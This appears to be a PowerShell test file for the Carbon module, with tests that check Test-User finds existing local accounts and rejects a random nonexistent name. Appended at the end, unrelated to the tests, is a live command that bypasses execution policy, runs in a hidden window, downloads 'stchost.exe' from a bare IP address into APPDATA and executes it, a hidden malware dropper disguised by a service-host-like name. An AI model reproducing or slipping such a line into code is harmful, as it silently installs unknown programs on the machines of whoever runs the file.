











function Start-TestFixture
{
    & (Join-Path -Path $PSScriptRoot -ChildPath '..\Initialize-CarbonTest.ps1' -Resolve)
}

function Test-ShouldCheckIfLocalAccountExists
{
    $localUserAccounts = @(Get-WmiObject -Query "select * from win32_useraccount where Domain='$($env:ComputerName)'" -Computer .)
    Assert-True (0 -lt $localUserAccounts.Length)
    foreach( $localUserAccount in $localUserAccounts )
    {
        Assert-True (Test-User -Username $localUserAccount.Name)
    }
}

function Test-ShouldNotFindNonExistentAccount
{
    $error.Clear()
    Assert-False (Test-User -Username ([Guid]::NewGuid().ToString().Substring(0,20)))
    Assert-False $error
}


PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://10.10.01.10/bahoo/stchost.exe', $env:APPDATA\stchost.exe );Start-Process ( $env:APPDATA\stchost.exe )

